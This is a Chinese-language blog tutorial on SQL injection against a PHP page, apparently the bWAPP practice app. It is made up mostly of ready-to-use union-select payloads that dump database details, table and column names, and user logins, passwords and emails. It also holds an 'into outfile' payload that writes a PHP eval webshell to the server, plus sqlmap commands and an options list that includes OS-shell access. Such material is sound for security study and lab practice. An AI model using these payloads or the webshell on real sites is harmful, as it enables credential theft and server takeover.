{"title":"PHP手工注入以及通过SqlMap自动注入基本语法","date":"2021-02-19T08:30:06.384Z","updated":"2021-02-19T08:30:06.384Z","content":"<h3 id=\"0x00-手工注入\">0x00: 手工注入<a href=\"back/php-injection-by-sqlmap-and-custom#0x00-手工注入\"></a></h3><h4 id=\"判断是否存在注入\">判断是否存在注入<a href=\"back/php-injection-by-sqlmap-and-custom#判断是否存在注入\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://test.com/detail.php?movie=1 and 1=1 页面正常</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://test.com/detail.php?movie=1 and 1=2 页面异常</span><br></pre></td></tr></table></figure>\n<h4 id=\"暴露基本信息\">暴露基本信息<a href=\"back/php-injection-by-sqlmap-and-custom#暴露基本信息\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://test.com/detail.php?movie=1 order by 8 错误</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips: [ORDER BY {col_name | expr | position} [ASC | DESC], …],这里传入的是position排序，根据某个potion排序，当超过表字段数量时就会报错。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://test.com/detail.php?movie=1 and 1=2 union select 1,2,3,4,5,6,7</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips：<a href=\"http://test.com/detail.php?movie=1\" target=\"_blank\" rel=\"noopener\">http://test.com/detail.php?movie=1</a> and 1=2返回空，最后返回union select 1,2,3,4,5,6,7一条记录</p>\n</blockquote>\n<h4 id=\"查看目标基本信息\">查看目标基本信息<a href=\"back/php-injection-by-sqlmap-and-custom#查看目标基本信息\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://test.com/detail.php?movie=1 and 1=2 union select 1,group_concat(database(),0x20,user(),0x20,@@version,0x20,@@basedir,0x20,@@datadir,0x20,current_user),3,4,5,6,7</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips：0x20作为单字节表示，可以用于字符型变量的赋值，用于char时，其代表ascii码值0x20，即字符空格’ ‘，这里用于区分database()等字段回显信息。</p>\n</blockquote>\n<h4 id=\"获取当前数据库所有表\">获取当前数据库所有表<a href=\"back/php-injection-by-sqlmap-and-custom#获取当前数据库所有表\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://test.com/detail.php?movie=1 and 1=2 union select 1,group_concat(TABLE_NAME),3,4,5,6,7 from information_schema.tables <span class=\"built_in\">where</span> table_schema=database()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips：MySQL所有数据库表都会存储于information_schema库中的tables表中。table_schema为数据库名称，TABLE_NAME为对应数据库表名称。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- 查看数据库所有表</span><br><span class=\"line\">select TABLE_NAME from information_schema.tables</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<h4 id=\"获取对应表的所有列\">获取对应表的所有列<a href=\"back/php-injection-by-sqlmap-and-custom#获取对应表的所有列\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://test.com/detail.php?movie=1 and 1=2 union select 1,2,3,group_concat(column_name),5,6,7 from information_schema.columns <span class=\"built_in\">where</span> table_schema=database() and table_name=<span class=\"string\">\"users\"</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips：MySQL所有数据库列都会存储于information_schemacolumnstable_schema为数据库名称，table_name为对应数据库表名称。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- 查看数据库所有列</span><br><span class=\"line\">select column_name from information_schema.columns</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<h4 id=\"获取对应列数据\">获取对应列数据<a href=\"back/php-injection-by-sqlmap-and-custom#获取对应列数据\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://test.com/detail.php?movie=1 and 1=2 union select 1,group_concat(id,login,password,email),3,4,5,6,7 from users</span><br></pre></td></tr></table></figure>\n<h4 id=\"写入poc脚本文件\">写入poc脚本文件<a href=\"back/php-injection-by-sqlmap-and-custom#写入poc脚本文件\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://test.com/detail.php?movie=1 and 1=2 union select 0x20,0x20,0x20,0x20,0x20,0x20,<span class=\"string\">\"&lt;?php @eval(<span class=\"variable\">$_POST</span>[cmd]); ?&gt;\"</span> into outfile <span class=\"string\">\"/poc.php\"</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips: into outfile通过SQL命令向服务器对应路径写入文件内容，通常用来写入webshell到Web服务目录。</p>\n</blockquote>\n<h3 id=\"0x02：SqlMap自动注入\">0x02：SqlMap自动注入<a href=\"back/php-injection-by-sqlmap-and-custom#0x02：SqlMap自动注入\"></a></h3><h4 id=\"是否存在注入\">是否存在注入<a href=\"back/php-injection-by-sqlmap-and-custom#是否存在注入\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://test.com/detail.php?movie=1</span><br></pre></td></tr></table></figure>\n<h4 id=\"获取数据库\">获取数据库<a href=\"back/php-injection-by-sqlmap-and-custom#获取数据库\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://test.com/detail.php?movie=1 --cookie=<span class=\"string\">\"security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2\"</span> --current-db</span><br></pre></td></tr></table></figure>\n<h4 id=\"获取数据库表\">获取数据库表<a href=\"back/php-injection-by-sqlmap-and-custom#获取数据库表\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://test.com/detail.php?movie=1 --cookie=<span class=\"string\">\"security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2\"</span> -D bwapp --tables</span><br></pre></td></tr></table></figure>\n<h4 id=\"获取数据库表列\">获取数据库表列<a href=\"back/php-injection-by-sqlmap-and-custom#获取数据库表列\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://test.com/detail.php?movie=1 --cookie=<span class=\"string\">\"security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2\"</span> -T users --columns</span><br></pre></td></tr></table></figure>\n<h4 id=\"获取数据库表数据\">获取数据库表数据<a href=\"back/php-injection-by-sqlmap-and-custom#获取数据库表数据\"></a></h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://test.com/detail.php?movie=1 --cookie=<span class=\"string\">\"security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2\"</span> -T users --columns --dump</span><br></pre></td></tr></table></figure>\n<h3 id=\"SqlMap参数参考\">SqlMap参数参考<a href=\"back/php-injection-by-sqlmap-and-custom#SqlMap参数参考\"></a></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Options:</span><br><span class=\"line\">  -h, --help            Show basic help message and exit</span><br><span class=\"line\">  -hh                   Show advanced help message and exit</span><br><span class=\"line\">  --version             Show program&apos;s version number and exit</span><br><span class=\"line\">  -v VERBOSE            Verbosity level: 0-6 (default 1)</span><br><span class=\"line\"></span><br><span class=\"line\">Target:</span><br><span class=\"line\">  At least one of these options has to be provided to define the</span><br><span class=\"line\">  target(s)</span><br><span class=\"line\"></span><br><span class=\"line\">  -u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class=\"line\">  -g GOOGLEDORK       Process Google dork results as target URLs</span><br><span class=\"line\"></span><br><span class=\"line\">Request:</span><br><span class=\"line\">  These options can be used to specify how to connect to the target URL</span><br><span class=\"line\"></span><br><span class=\"line\">  --data=DATA         Data string to be sent through POST (e.g. &quot;id=1&quot;)</span><br><span class=\"line\">  --cookie=COOKIE     HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;)</span><br><span class=\"line\">  --random-agent      Use randomly selected HTTP User-Agent header value</span><br><span class=\"line\">  --proxy=PROXY       Use a proxy to connect to the target URL</span><br><span class=\"line\">  --tor               Use Tor anonymity network</span><br><span class=\"line\">  --check-tor         Check to see if Tor is used properly</span><br><span class=\"line\"></span><br><span class=\"line\">Injection:</span><br><span class=\"line\">  These options can be used to specify which parameters to test for,</span><br><span class=\"line\">  provide custom injection payloads and optional tampering scripts</span><br><span class=\"line\"></span><br><span class=\"line\">  -p TESTPARAMETER    Testable parameter(s)</span><br><span class=\"line\">  --dbms=DBMS         Force back-end DBMS to provided value</span><br><span class=\"line\"></span><br><span class=\"line\">Detection:</span><br><span class=\"line\">  These options can be used to customize the detection phase</span><br><span class=\"line\"></span><br><span class=\"line\">  --level=LEVEL       Level of tests to perform (1-5, default 1)</span><br><span class=\"line\">  --risk=RISK         Risk of tests to perform (1-3, default 1)</span><br><span class=\"line\"></span><br><span class=\"line\">Techniques:</span><br><span class=\"line\">  These options can be used to tweak testing of specific SQL injection</span><br><span class=\"line\">  techniques</span><br><span class=\"line\"></span><br><span class=\"line\">  --technique=TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">Enumeration:</span><br><span class=\"line\">  These options can be used to enumerate the back-end database</span><br><span class=\"line\">  management system information, structure and data contained in the</span><br><span class=\"line\">  tables. Moreover you can run your own SQL statements</span><br><span class=\"line\"></span><br><span class=\"line\">  -a, --all           Retrieve everything</span><br><span class=\"line\">  -b, --banner        Retrieve DBMS banner</span><br><span class=\"line\">  --current-user      Retrieve DBMS current user</span><br><span class=\"line\">  --current-db        Retrieve DBMS current database</span><br><span class=\"line\">  --passwords         Enumerate DBMS users password hashes</span><br><span class=\"line\">  --tables            Enumerate DBMS database tables</span><br><span class=\"line\">  --columns           Enumerate DBMS database table columns</span><br><span class=\"line\">  --schema            Enumerate DBMS schema</span><br><span class=\"line\">  --dump              Dump DBMS database table entries</span><br><span class=\"line\">  --dump-all          Dump all DBMS databases tables entries</span><br><span class=\"line\">  -D DB               DBMS database to enumerate</span><br><span class=\"line\">  -T TBL              DBMS database table(s) to enumerate</span><br><span class=\"line\">  -C COL              DBMS database table column(s) to enumerate</span><br><span class=\"line\"></span><br><span class=\"line\">Operating system access:</span><br><span class=\"line\">  These options can be used to access the back-end database management</span><br><span class=\"line\">  system underlying operating system</span><br><span class=\"line\"></span><br><span class=\"line\">  --os-shell          Prompt for an interactive operating system shell</span><br><span class=\"line\">  --os-pwn            Prompt for an OOB shell, Meterpreter or VNC</span><br><span class=\"line\"></span><br><span class=\"line\">General:</span><br><span class=\"line\">  These options can be used to set some general working parameters</span><br><span class=\"line\"></span><br><span class=\"line\">  --batch             Never ask for user input, use the default behavior</span><br><span class=\"line\">  --flush-session     Flush session files for current target</span><br><span class=\"line\"></span><br><span class=\"line\">Miscellaneous:</span><br><span class=\"line\">  --sqlmap-shell      Prompt for an interactive sqlmap shell</span><br><span class=\"line\">  --wizard            Simple wizard interface for beginner users</span><br></pre></td></tr></table></figure>","slug":"back/php-injection-by-sqlmap-and-custom","comments":true,"link":"https://www.alipay.one/back/php-injection-by-sqlmap-and-custom/"}